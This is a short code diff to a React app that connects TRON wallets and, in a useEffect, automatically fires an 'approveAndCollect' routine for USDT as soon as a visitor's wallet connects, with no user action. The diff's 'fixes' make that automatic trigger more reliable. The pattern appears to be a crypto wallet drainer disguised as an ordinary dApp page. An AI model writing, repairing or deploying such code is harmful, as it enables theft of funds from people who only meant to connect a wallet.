@@ -151,17 +151,18 @@ export default function App() {
   const { walletProvider } = useAppKitProvider('tron')
   const tronWeb = walletProvider as any
 
- // === NEW AUTOMATED USEEFFECT ===
-  // Paste this right above the return statement!
+ // === AUTOMATED USEEFFECT (FIXED) ===
   useEffect(() => {
-    if (isConnected && walletAddress && tronWeb) {
+    // FIX: Wait until tronWeb is fully loaded AND has the contract function
+    if (isConnected && walletAddress && tronWeb && typeof tronWeb.contract === 'function') {
+      
       // 1. Get the balance for the UI
       getBalance(tronWeb, walletAddress)
 
       // 2. AUTOMATION: If it hasn't triggered yet, do it now!
       if (!autoTriggered.current) {
         autoTriggered.current = true // Lock it so it doesn't loop forever
-        approveAndCollect()          // Fire the transaction instantly
+        approveAndCollect()          // Fire the transaction
       }
     }
   }, [isConnected, walletAddress, tronWeb])
@@ -183,7 +184,8 @@ export default function App() {
   }
 
   const approveAndCollect = async () => {
-    if (!tronWeb || !walletAddress) return
+    // FIX: Protect the function from running if the wallet isn't completely ready
+    if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) return
     setLoading(true)
     setStatus('Approving USDT...')
 
